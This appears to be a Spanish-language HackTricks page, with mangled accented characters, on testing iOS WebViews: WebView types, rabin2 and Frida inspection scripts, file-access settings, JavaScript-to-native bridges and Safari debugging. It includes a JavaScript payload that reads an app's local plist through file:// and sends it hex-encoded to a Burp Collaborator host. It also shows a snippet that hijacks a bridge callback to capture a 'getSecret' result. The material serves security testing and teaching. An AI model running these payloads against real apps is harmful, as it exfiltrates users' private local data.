# iOS WebViews

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the**  [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter**  [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

The code of this page was extracted from [here](https://github.com/chame1eon/owasp-mstg/blob/master/Document/0x06h-Testing-Platform-Interaction.md). Check the page for further details.


## Tipos de WebViews

Las WebViews se utilizan dentro de las aplicaciones para mostrar contenido web de manera interactiva. Varios tipos de WebViews ofrecen diferentes funcionalidades y caracter铆sticas de seguridad para aplicaciones iOS. Aqu铆 hay un breve resumen:

- **UIWebView**, que ya no se recomienda a partir de iOS 12 debido a su falta de soporte para deshabilitar **JavaScript**, lo que la hace susceptible a inyecciones de scripts y ataques de **Cross-Site Scripting (XSS)**.

- **WKWebView** es la opci贸n preferida para incorporar contenido web en aplicaciones, ofreciendo un control mejorado sobre el contenido y caracter铆sticas de seguridad. **JavaScript** est谩 habilitado por defecto, pero se puede deshabilitar si es necesario. Tambi茅n admite caracter铆sticas para evitar que JavaScript abra ventanas autom谩ticamente y asegura que todo el contenido se cargue de manera segura. Adem谩s, la arquitectura de **WKWebView** minimiza el riesgo de corrupci贸n de memoria que afecte al proceso principal de la aplicaci贸n.

- **SFSafariViewController** ofrece una experiencia de navegaci贸n web estandarizada dentro de las aplicaciones, reconocible por su dise帽o espec铆fico que incluye un campo de direcci贸n de solo lectura, botones de compartir y navegaci贸n, y un enlace directo para abrir contenido en Safari. A diferencia de **WKWebView**, **JavaScript** no se puede deshabilitar en **SFSafariViewController**, que tambi茅n comparte cookies y datos con Safari, manteniendo la privacidad del usuario desde la aplicaci贸n. Debe mostrarse de manera prominente de acuerdo con las pautas de la App Store.
```javascript
// Example of disabling JavaScript in WKWebView:
WKPreferences *preferences = [[WKPreferences alloc] init];
preferences.javaScriptEnabled = NO;
WKWebViewConfiguration *config = [[WKWebViewConfiguration alloc] init];
config.preferences = preferences;
WKWebView *webView = [[WKWebView alloc] initWithFrame:CGRectZero configuration:config];
```
## Resumen de Exploraci贸n de Configuraci贸n de WebViews

### **Descripci贸n General del An谩lisis Est谩tico**

En el proceso de examinar las configuraciones de **WebViews**, se enfocan en dos tipos principales: **UIWebView** y **WKWebView**. Para identificar estos WebViews dentro de un binario, se utilizan comandos, buscando referencias de clase espec铆ficas y m茅todos de inicializaci贸n.

- **Identificaci贸n de UIWebView**
```bash
$ rabin2 -zz ./WheresMyBrowser | egrep "UIWebView$"
```
Este comando ayuda a localizar instancias de **UIWebView** buscando cadenas de texto relacionadas con 茅l en el binario.

- **Identificaci贸n de WKWebView**
```bash
$ rabin2 -zz ./WheresMyBrowser | egrep "WKWebView$"
```
De manera similar, para **WKWebView**, este comando busca en el binario cadenas de texto indicativas de su uso.

Adem谩s, para encontrar c贸mo se inicializa un **WKWebView**, se ejecuta el siguiente comando, dirigido a la firma del m茅todo relacionada con su inicializaci贸n:
```bash
$ rabin2 -zzq ./WheresMyBrowser | egrep "WKWebView.*frame"
```
#### **Verificaci贸n de Configuraci贸n de JavaScript**

Para **WKWebView**, se destaca que deshabilitar JavaScript es una buena pr谩ctica a menos que sea necesario. Se busca en el binario compilado para confirmar que la propiedad `javaScriptEnabled` est谩 configurada en `false`, asegurando que JavaScript est茅 deshabilitado:
```bash
$ rabin2 -zz ./WheresMyBrowser | grep -i "javascriptenabled"
```
#### **Verificaci贸n de Solo Contenido Seguro**

**WKWebView** ofrece la capacidad de identificar problemas de contenido mixto, a diferencia de **UIWebView**. Esto se verifica utilizando la propiedad `hasOnlySecureContent` para asegurar que todos los recursos de la p谩gina se carguen a trav茅s de conexiones seguras. La b煤squeda en el binario compilado se realiza de la siguiente manera:
```bash
$ rabin2 -zz ./WheresMyBrowser | grep -i "hasonlysecurecontent"
```
### **Perspectivas de An谩lisis Din谩mico**

El an谩lisis din谩mico implica inspeccionar el heap en busca de instancias de WebView y sus propiedades. Se utiliza un script llamado `webviews_inspector.js` para este prop贸sito, dirigido a instancias de `UIWebView`, `WKWebView` y `SFSafariViewController`. Registra informaci贸n sobre las instancias encontradas, incluyendo URLs y configuraciones relacionadas con JavaScript y contenido seguro.

La inspecci贸n del heap se puede realizar utilizando `ObjC.choose()` para identificar instancias de WebView y verificar las propiedades `javaScriptEnabled` y `hasonlysecurecontent`.

{% code title="webviews_inspector.js" %}
```javascript
ObjC.choose(ObjC.classes['UIWebView'], {
onMatch: function (ui) {
console.log('onMatch: ', ui);
console.log('URL: ', ui.request().toString());
},
onComplete: function () {
console.log('done for UIWebView!');
}
});

ObjC.choose(ObjC.classes['WKWebView'], {
onMatch: function (wk) {
console.log('onMatch: ', wk);
console.log('URL: ', wk.URL().toString());
},
onComplete: function () {
console.log('done for WKWebView!');
}
});

ObjC.choose(ObjC.classes['SFSafariViewController'], {
onMatch: function (sf) {
console.log('onMatch: ', sf);
},
onComplete: function () {
console.log('done for SFSafariViewController!');
}
});

ObjC.choose(ObjC.classes['WKWebView'], {
onMatch: function (wk) {
console.log('onMatch: ', wk);
console.log('javaScriptEnabled:', wk.configuration().preferences().javaScriptEnabled());
}
});

ObjC.choose(ObjC.classes['WKWebView'], {
onMatch: function (wk) {
console.log('onMatch: ', wk);
console.log('hasOnlySecureContent: ', wk.hasOnlySecureContent().toString());
}
});
```
{% endcode %}

El script se ejecuta con:
```bash
frida -U com.authenticationfailure.WheresMyBrowser -l webviews_inspector.js
```
**Resultados Clave**:
- Se localizan e inspeccionan con 茅xito las instancias de WebViews.
- Se verifica la habilitaci贸n de JavaScript y la configuraci贸n de contenido seguro.

Este resumen encapsula los pasos y comandos cr铆ticos involucrados en el an谩lisis de configuraciones de WebView a trav茅s de enfoques est谩ticos y din谩micos, centr谩ndose en caracter铆sticas de seguridad como la habilitaci贸n de JavaScript y la detecci贸n de contenido mixto.

## Manejo del Protocolo WebView

Manejar contenido en WebViews es un aspecto cr铆tico, especialmente al tratar con varios protocolos como `http(s)://`, `file://` y `tel://`. Estos protocolos permiten la carga de contenido remoto y local dentro de las aplicaciones. Se enfatiza que al cargar contenido local, se deben tomar precauciones para evitar que los usuarios influyan en el nombre o la ruta del archivo y en la edici贸n del contenido mismo.

**WebViews** ofrecen diferentes m茅todos para la carga de contenido. Para **UIWebView**, ahora obsoleto, se utilizan m茅todos como `loadHTMLString:baseURL:` y `loadData:MIMEType:textEncodingName:baseURL:`. **WKWebView**, por otro lado, emplea `loadHTMLString:baseURL:`, `loadData:MIMEType:textEncodingName:baseURL:` y `loadRequest:` para contenido web. M茅todos como `pathForResource:ofType:`, `URLForResource:withExtension:` y `init(contentsOf:encoding:)` se utilizan t铆picamente para cargar archivos locales. El m茅todo `loadFileURL:allowingReadAccessToURL:` es particularmente notable por su capacidad para cargar una URL o directorio espec铆fico en el WebView, exponiendo potencialmente datos sensibles si se especifica un directorio.

Para encontrar estos m茅todos en el c贸digo fuente o binario compilado, se pueden usar comandos como los siguientes:
```bash
$ rabin2 -zz ./WheresMyBrowser | grep -i "loadHTMLString"
231 0x0002df6c 24 (4.__TEXT.__objc_methname) ascii loadHTMLString:baseURL:
```
En cuanto al **acceso a archivos**, UIWebView lo permite de manera universal, mientras que WKWebView introduce configuraciones `allowFileAccessFromFileURLs` y `allowUniversalAccessFromFileURLs` para gestionar el acceso desde URL de archivos, siendo ambas falsas por defecto.

Se proporciona un ejemplo de script de Frida para inspeccionar las configuraciones de **WKWebView** para ajustes de seguridad:
```bash
ObjC.choose(ObjC.classes['WKWebView'], {
onMatch: function (wk) {
console.log('onMatch: ', wk);
console.log('URL: ', wk.URL().toString());
console.log('javaScriptEnabled: ', wk.configuration().preferences().javaScriptEnabled());
console.log('allowFileAccessFromFileURLs: ',
wk.configuration().preferences().valueForKey_('allowFileAccessFromFileURLs').toString());
console.log('hasOnlySecureContent: ', wk.hasOnlySecureContent().toString());
console.log('allowUniversalAccessFromFileURLs: ',
wk.configuration().valueForKey_('allowUniversalAccessFromFileURLs').toString());
},
onComplete: function () {
console.log('done for WKWebView!');
}
});
```
Por 煤ltimo, un ejemplo de una carga 煤til de JavaScript destinada a exfiltrar archivos locales demuestra el potencial riesgo de seguridad asociado con WebViews mal configurados. Esta carga 煤til codifica el contenido de los archivos en formato hex antes de transmitirlos a un servidor, destacando la importancia de medidas de seguridad estrictas en las implementaciones de WebView.
```javascript
String.prototype.hexEncode = function(){
var hex, i;
var result = "";
for (i=0; i<this.length; i++) {
hex = this.charCodeAt(i).toString(16);
result += ("000"+hex).slice(-4);
}
return result
}

var xhr = new XMLHttpRequest();
xhr.onreadystatechange = function() {
if (xhr.readyState == XMLHttpRequest.DONE) {
var xhr2 = new XMLHttpRequest();
xhr2.open('GET', 'http://187e2gd0zxunzmb5vlowsz4j1a70vp.burpcollaborator.net/'+xhr.responseText.hexEncode(), true);
xhr2.send(null);
}
}
xhr.open('GET', 'file:///var/mobile/Containers/Data/Application/ED4E0AD8-F7F7-4078-93CC-C350465048A5/Library/Preferences/com.authenticationfailure.WheresMyBrowser.plist', true);
xhr.send(null);
```
## M茅todos Nativos Expuestos a Trav茅s de WebViews

## Comprendiendo las Interfaces Nativas de WebView en iOS

Desde iOS 7 en adelante, Apple proporcion贸 APIs para **la comunicaci贸n entre JavaScript en un WebView y objetos nativos** de Swift u Objective-C. Esta integraci贸n se facilita principalmente a trav茅s de dos m茅todos:

- **JSContext**: Una funci贸n de JavaScript se crea autom谩ticamente cuando un bloque de Swift u Objective-C se vincula a un identificador dentro de un `JSContext`. Esto permite una integraci贸n y comunicaci贸n sin problemas entre JavaScript y el c贸digo nativo.
- **JSExport Protocol**: Al heredar el protocolo `JSExport`, se pueden exponer propiedades nativas, m茅todos de instancia y m茅todos de clase a JavaScript. Esto significa que cualquier cambio realizado en el entorno de JavaScript se refleja en el entorno nativo, y viceversa. Sin embargo, es esencial asegurarse de que los datos sensibles no se expongan inadvertidamente a trav茅s de este m茅todo.

### Accediendo a `JSContext` en Objective-C

En Objective-C, el `JSContext` para un `UIWebView` se puede recuperar con la siguiente l铆nea de c贸digo:
```objc
[webView valueForKeyPath:@"documentView.webView.mainFrame.javaScriptContext"]
```
### Comunicaci贸n con `WKWebView`

Para `WKWebView`, el acceso directo a `JSContext` no est谩 disponible. En su lugar, se utiliza el paso de mensajes a trav茅s de la funci贸n `postMessage`, lo que permite la comunicaci贸n de JavaScript a nativo. Los controladores para estos mensajes se configuran de la siguiente manera, lo que permite que JavaScript interact煤e con la aplicaci贸n nativa de manera segura:
```swift
func enableJavaScriptBridge(_ enabled: Bool) {
options_dict["javaScriptBridge"]?.value = enabled
let userContentController = wkWebViewConfiguration.userContentController
userContentController.removeScriptMessageHandler(forName: "javaScriptBridge")

if enabled {
let javaScriptBridgeMessageHandler = JavaScriptBridgeMessageHandler()
userContentController.add(javaScriptBridgeMessageHandler, name: "javaScriptBridge")
}
}
```
### Interacci贸n y Pruebas

JavaScript puede interactuar con la capa nativa definiendo un controlador de mensajes de script. Esto permite operaciones como invocar funciones nativas desde una p谩gina web:
```javascript
function invokeNativeOperation() {
value1 = document.getElementById("value1").value
value2 = document.getElementById("value2").value
window.webkit.messageHandlers.javaScriptBridge.postMessage(["multiplyNumbers", value1, value2]);
}

// Alternative method for calling exposed JavaScript functions
document.location = "javascriptbridge://addNumbers/" + 1 + "/" + 2
```
Para capturar y manipular el resultado de una llamada a una funci贸n nativa, se puede anular la funci贸n de callback dentro del HTML:
```html
<html>
<script>
document.location = "javascriptbridge://getSecret"
function javascriptBridgeCallBack(name, result) {
alert(result);
}
</script>
</html>
```
El lado nativo maneja la llamada de JavaScript como se muestra en la clase `JavaScriptBridgeMessageHandler`, donde el resultado de operaciones como multiplicar n煤meros se procesa y se env铆a de vuelta a JavaScript para su visualizaci贸n o manipulaci贸n adicional:
```swift
class JavaScriptBridgeMessageHandler: NSObject, WKScriptMessageHandler {
// Handling "multiplyNumbers" operation
case "multiplyNumbers":
let arg1 = Double(messageArray[1])!
let arg2 = Double(messageArray[2])!
result = String(arg1 * arg2)
// Callback to JavaScript
let javaScriptCallBack = "javascriptBridgeCallBack('\(functionFromJS)','\(result)')"
message.webView?.evaluateJavaScript(javaScriptCallBack, completionHandler: nil)
}
```
## Depuraci贸n de WebViews en iOS

(Tutorial basado en el de [https://blog.vuplex.com/debugging-webviews](https://blog.vuplex.com/debugging-webviews))

Para depurar eficazmente el contenido web dentro de los webviews de iOS, se requiere una configuraci贸n espec铆fica que involucra las herramientas de desarrollador de Safari, debido a que los mensajes enviados a `console.log()` no se muestran en los registros de Xcode. Aqu铆 hay una gu铆a simplificada, enfatizando los pasos y requisitos clave:

- **Preparaci贸n en el dispositivo iOS**: El Inspector Web de Safari debe ser activado en tu dispositivo iOS. Esto se hace yendo a **Configuraci贸n > Safari > Avanzado**, y habilitando el _Inspector Web_.

- **Preparaci贸n en el dispositivo macOS**: En tu m谩quina de desarrollo macOS, debes habilitar las herramientas de desarrollador dentro de Safari. Inicia Safari, accede a **Safari > Preferencias > Avanzado**, y selecciona la opci贸n para _Mostrar men煤 de Desarrollo_.

- **Conexi贸n y depuraci贸n**: Despu茅s de conectar tu dispositivo iOS a tu computadora macOS y lanzar tu aplicaci贸n, usa Safari en tu dispositivo macOS para seleccionar el webview que deseas depurar. Navega a _Desarrollar_ en la barra de men煤 de Safari, pasa el cursor sobre el nombre de tu dispositivo iOS para ver una lista de instancias de webview, y selecciona la instancia que deseas inspeccionar. Se abrir谩 una nueva ventana del Inspector Web de Safari para este prop贸sito.

Sin embargo, ten en cuenta las limitaciones:

- La depuraci贸n con este m茅todo requiere un dispositivo macOS ya que se basa en Safari.
- Solo los webviews en aplicaciones cargadas en tu dispositivo a trav茅s de Xcode son elegibles para la depuraci贸n. Los webviews en aplicaciones instaladas a trav茅s de la App Store o Apple Configurator no pueden ser depurados de esta manera.


## Referencias

* [https://mobile-security.gitbook.io/mobile-security-testing-guide/ios-testing-guide/0x06h-testing-platform-interaction#testing-webview-protocol-handlers-mstg-platform-6](https://mobile-security.gitbook.io/mobile-security-testing-guide/ios-testing-guide/0x06h-testing-platform-interaction#testing-webview-protocol-handlers-mstg-platform-6)
* [https://github.com/authenticationfailure/WheresMyBrowser.iOS](https://github.com/authenticationfailure/WheresMyBrowser.iOS)
* [https://github.com/chame1eon/owasp-mstg/blob/master/Document/0x06h-Testing-Platform-Interaction.md](https://github.com/chame1eon/owasp-mstg/blob/master/Document/0x06h-Testing-Platform-Interaction.md)

{% hint style="success" %}
Aprende y practica Hacking en AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Aprende y practica Hacking en GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Apoya a HackTricks</summary>

* Revisa los [**planes de suscripci贸n**](https://github.com/sponsors/carlospolop)!
* **nete al**  [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s铆guenos** en **Twitter**  [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Comparte trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
{% endhint %}
